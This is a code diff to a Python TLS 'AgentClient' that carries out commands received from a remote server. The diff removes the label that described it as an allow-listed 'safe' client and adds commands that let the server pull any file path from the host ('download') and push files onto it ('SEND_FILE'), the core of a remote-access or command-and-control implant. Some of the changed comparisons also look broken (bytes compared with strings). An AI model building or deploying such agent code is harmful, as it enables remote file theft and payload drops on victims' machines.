@@ -2,7 +2,9 @@ import socket
 import ssl
 import time
 import platform
-from src.client.utils.config import logger  # reuse your logger setup
+from src.client.utils.config import logger
+from utils.socket_utils import readline
+from utils.file_utils import FileUtils
 
 
 class AgentClient:
@@ -39,39 +41,39 @@ class AgentClient:
             raise RuntimeError("Not connected")
 
         # Optional: say hello so server sees you
-        self._send_line("hello from agent")
+        self._send_line("Agent Connected")
 
-        buf = b""
         try:
             while self.running:
-                chunk = self.sock.recv(4096)
+                chunk = readline(self.sock)
+
                 if not chunk:
-                    logger.debug("[agent] Server disconnected")
-                    break
+                    continue
 
-                buf += chunk
-
-                ### replace this to a single line
-                while b"\n" in buf:
-                    line, buf = buf.split(b"\n", 1)
-                    cmd = line.decode("utf-8", errors="replace").strip()
-                    if cmd:
-                        self._handle_command(cmd)
+                self._handle_command(chunk)
         except KeyboardInterrupt:
             logger.debug("[agent] CTRL+C pressed, exiting")
         except Exception as e:
-            logger.debug("[agent] Unexpected error %s", e)
+            logger.debug("[agent] %s", e)
         finally:
             self.close()
 
     def _handle_command(self, cmd):
         logger.info("[agent] Received command: %r", cmd)
 
-        # Allow-list dispatch (SAFE)
         if cmd == "help":
             self._send_line(
                 "commands: help, ping, os, time, echo <text>, quit"
             )
+
+        elif cmd.decode('utf-8').startswith("download "):
+            filepath = cmd.split()[1].decode('utf-8')
+            logger.debug(f"[agent] Downloading File {filepath}")
+            self._send_file(filepath)
+
+        elif cmd.decode('utf-8').startswith("SEND_FILE "):
+            filename = cmd.split()[1].decode("utf-8")
+            FileUtils.download_file(self.sock, filename)
 
         elif cmd == "ping":
             self._send_line("pong")
@@ -92,6 +94,12 @@ class AgentClient:
         else:
             self._send_line("error: unknown command (try: help)")
 
+    def _send_file(self, filename: str):
+        try:
+            FileUtils.send_file(self.sock, filename)
+        except Exception as e:
+            logger.debug("[agent] Error in sendfile %s", e)
+
     def _send_line(self, text):
         data = (text + "\n").encode("utf-8")
         try:
@@ -108,19 +116,3 @@ class AgentClient:
                 pass
             self.sock = None
         logger.debug("[agent] Closed")
-
-
-#if __name__ == "__main__":
-    # Example:
-    # python agent.py 127.0.0.1 1337 server.crt
-#    import argparse
-
-#    parser = argparse.ArgumentParser(description="Safe TLS agent client (allow-listed commands).")
-#    parser.add_argument("host")
-#    parser.add_argument("port", type=int)
-#    parser.add_argument("cafile", help="CA/cert file used to verify the server (e.g. server.crt for self-signed)")
-#    args = parser.parse_args()
-
-#    agent = AgentClient(args.host, args.port, args.cafile)
-#    agent.connect()
-#    agent.run()
